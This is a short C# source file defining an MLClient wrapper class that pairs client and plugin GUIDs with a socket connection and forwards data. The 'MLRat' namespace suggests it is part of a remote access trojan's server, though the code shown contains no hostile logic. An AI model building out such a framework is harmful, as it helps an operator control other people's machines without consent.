﻿using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLRat.Networking
{
    public class MLClient : IClient
    {
        private Guid _clientID, _pluginID;
        private eSock.Server.eSockClient Client;
        public MLClient(Guid id, Guid pid, eSock.Server.eSockClient _client)
        {
            _clientID = id;
            _pluginID = pid;
            Client = _client;
        }
        public Guid ID
        {
            get { return _clientID; }
        }

        public void Send(params object[] data)
        {
            Client.Send(_pluginID, (object) data);
        }
    }
}
